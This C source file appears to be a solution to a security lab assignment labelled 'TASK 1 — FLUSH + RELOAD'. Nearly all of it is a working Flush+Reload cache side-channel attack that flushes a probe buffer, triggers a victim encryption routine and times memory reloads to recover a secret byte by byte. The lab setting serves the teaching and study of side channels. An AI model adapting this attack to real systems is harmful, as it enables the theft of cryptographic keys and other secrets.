#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <assert.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <ctype.h>
#include <pthread.h>

#include "asm.h"
#include "libcrypto/crypto.h"

static inline uint64_t time_access(volatile unsigned char *addr) {
    cpuid();
    uint64_t t0 = rdtscp();
    (void)*addr;
    return rdtscp() - t0;
}


int main(int argc, char *argv[]) {
    char leaked_secret[secret_length + 1];
    memset(leaked_secret, 0, (secret_length+1) * sizeof(char));

    // You need to properly set the following variables 
    int CACHE_THRESHOLD = 100;
    int STRIDE = 4096;
    int ITERATIONS = 50;
    int RELOADBUFFER_SIZE = 256 * STRIDE;
    unsigned char *reloadbuffer = (unsigned char*)malloc(RELOADBUFFER_SIZE);
    assert(reloadbuffer);

    /*
     * ================ TASK 1 ================
     *               FLUSH + RELOAD 
     * ========================================
     */
    for (int i = 0; i < 256; i++) {
        reloadbuffer[i * STRIDE] = 1;
    }

    
    for (size_t idx = 0; idx < secret_length; idx++) {
        size_t counts[256] = {0};

        for (size_t it = 0; it < ITERATIONS; it++) {
            for (size_t i = 0; i < 256; i++) {
                clflush(reloadbuffer + i * STRIDE);
            }
            mfence();
            cpuid();

            encrypt_secret_byte(reloadbuffer, STRIDE, idx);

            for (size_t i = 0; i < 256; i++) {
                size_t k = (i * 167 + 13) & 255;
                uint64_t dt = time_access(reloadbuffer + k * STRIDE);
                if (dt < (uint64_t)CACHE_THRESHOLD) counts[k]++;
            }
        }

        int best = 0, bestc = -1;
        for (int v = 0; v < 256; v++) {
            if (counts[v] > bestc) { bestc = counts[v]; best = v; }
        }
        leaked_secret[idx] = (char)best;
    }

    printf("Secret: %s\n", leaked_secret);

    return 0;
}
